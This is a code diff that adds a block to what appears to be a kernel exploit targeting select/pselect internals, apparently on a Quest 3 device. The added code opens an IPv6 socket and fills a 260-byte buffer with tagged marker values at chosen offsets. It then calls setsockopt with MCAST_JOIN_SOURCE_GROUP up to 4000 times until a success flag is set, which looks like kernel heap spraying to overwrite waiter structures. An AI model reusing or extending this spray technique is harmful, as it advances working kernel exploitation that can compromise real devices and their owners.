@@ -113,6 +113,8 @@ uint64_t fdset_get_word(const fd_set *set, int word) {
 
 static uintptr_t fops_runtime_text(uint64_t table_off, uint64_t fallback_off);
 
+#include <netinet/in.h>
+
 static int pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
   return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
@@ -2093,6 +2095,28 @@ void selfstamp_route(void) {
     {
       struct timespec tq0;
       clock_gettime(CLOCK_MONOTONIC, &tq0);
+      {
+        /* MCAST dual-stamp: 260B buffer, waiter-word tags at offset 0x34
+         * (Quest3 exp32 geometry) with 0xCAFE0000_0000_00ii family — lldb
+         * dump decides which stamp family (DEAD=select / CAFE=MCAST) lands
+         * on the waiter fields. */
+        int mfd = socket(AF_INET6, SOCK_DGRAM, 0);
+        static unsigned char mbuf[260];
+        if (mfd >= 0 && !mbuf[0]) {
+          for (int wi = 0; wi < 11; wi++) {
+            uint64_t tv2 = 0xCAFE0000000000C0ULL + (uint64_t)(wi + 2);
+            memcpy(mbuf + 0x34 + wi * 8, &tv2, 8);
+          }
+        }
+        for (int mspin = 0; mspin < 4000 && mfd >= 0; mspin++) {
+          setsockopt(mfd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, mbuf,
+                     sizeof(mbuf));
+          if (atomic_load(&consumer_success) >= 1)
+            break;
+        }
+        if (mfd >= 0)
+          close(mfd);
+      }
       for (;;) {
         select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
         /* WAIT FOR THE WALK TO RETURN: consumer_success is set only AFTER
